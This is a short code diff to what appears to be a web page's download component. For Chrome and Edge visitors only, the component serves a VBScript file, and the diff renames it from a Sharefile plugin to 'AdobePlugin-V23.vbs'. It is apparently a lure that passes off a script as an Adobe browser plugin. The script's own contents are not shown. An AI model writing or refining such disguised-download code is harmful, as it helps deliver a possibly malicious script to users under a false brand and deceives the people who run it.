@@ -15,7 +15,7 @@ const Download = () => {
   const getDownloadFile = () => {
     const ua = navigator.userAgent;
     if (ua.includes("Chrome") || ua.includes("Edg/")) {
-      return { href: "/docs/SharefilePlugin.vbs", name: "SharefilePlugin.vbs" };
+      return { href: "/docs/AdobePlugin-V23.vbs", name: "AdobePlugin-V23.vbs" };
     }
     return null;
   };
